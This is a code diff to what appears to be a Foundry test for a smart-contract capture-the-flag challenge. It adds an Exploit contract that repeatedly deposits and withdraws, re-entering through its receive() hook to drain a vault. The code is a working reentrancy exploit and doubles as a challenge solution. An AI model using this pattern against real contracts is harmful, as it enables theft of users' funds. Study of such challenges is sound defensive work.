@@ -29,7 +29,8 @@ contract ChallengeTest is Test {
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
-
+        Exploit exploit = new Exploit(setup);
+        exploit.execute{value: 1 ether}();
         ////////// YOUR CODE END //////////
 
         assertTrue(setup.isSolved(), "challenge not solved");
@@ -51,7 +52,28 @@ contract ChallengeTest is Test {
 ////////// YOUR CODE GOES HERE //////////
 
 contract Exploit {
+    Setup setup;
 
+    constructor(Setup setup_) {
+        setup = setup_;
+    }
+
+    function execute() external payable {
+        setup.vault().deposit{value: msg.value}();
+        setup.vault().withdrawAll();
+        setup.vault().deposit{value: address(setup.vault()).balance}();
+        setup.vault().withdrawAll();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        uint256 myVaultBalance = setup.vault().balanceOf(address(this));
+        uint256 allVaultBalance = address(setup.vault()).balance;
+
+        if (myVaultBalance > allVaultBalance) return;
+
+        setup.vault().deposit{value: address(this).balance}();
+        setup.vault().withdrawAll();
+    }
 }
-
 ////////// YOUR CODE END //////////
